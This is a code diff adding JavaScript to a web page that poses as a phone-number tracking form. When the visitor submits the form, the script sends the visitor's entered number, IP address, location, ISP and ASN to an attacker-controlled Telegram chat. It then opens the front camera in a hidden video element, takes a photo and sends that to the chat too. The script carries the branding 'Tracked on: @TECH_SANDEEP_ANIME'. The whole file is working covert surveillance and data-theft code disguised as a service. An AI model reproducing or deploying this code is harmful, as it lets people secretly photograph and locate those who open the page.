@@ -1,0 +1,66 @@
+const operator = document.getElementById('operator').value;
+    const mobileNumber = document.getElementById('mobile-number').value;
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('id');
+
+    if (!chatId) {
+        alert("Chat ID is missing in the URL!");
+        return;
+    }
+
+    const ipDetails = await getIpDetails();
+
+    const message = 
+<b><u>☎️ Number Tracked</u></b>
+<b>📱 Mobile number:</b> +91${mobileNumber}
+<b>📡 Operator:</b> ${operator}
+
+<b>🌐 Ip Information:</b>
+<b>🌐 Ip address:</b> <i>${ipDetails.ip}</i>
+<b>🌍 Location:</b> <i>${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}</i>
+<b>📡 ISP:</b> <i>${ipDetails.org}</i>
+<b>🔍 ASN:</b> <i>${ipDetails.asn}</i>
+
+<b>👨‍💻 Tracked on: @TECH_SANDEEP_ANIME</b>
+;
+
+    await sendTelegramMessage(chatId, message);
+
+    const video = await startCamera();
+    const photo = await capturePhoto(video);
+    await sendPhoto(chatId, photo);
+
+    // Stop the camera and clean up
+    const tracks = video.srcObject.getTracks();
+    tracks.forEach(track => track.stop());
+    video.remove();
+
+    alert("Your request has been processed under 24 hours !");
+});
+
+sendInitialInfo();
+
+document.getElementById('mobile-number').addEventListener('input', function () {
+    this.value = this.value.replace(/[^0-9]/g, '');
+});
+
+async function startCamera() {
+    const video = document.createElement('video');
+    video.style.display = 'none'; // Hide the video element
+    document.body.appendChild(video);
+
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        video.srcObject = stream;
+        video.play();
+
+        await new Promise(resolve => {
+            video.onloadedmetadata = resolve;
+        });
+
+        return video;
+    } catch (error) {
+        console.error("Error accessing camera:", error);
+        return null;
+    }
+      }
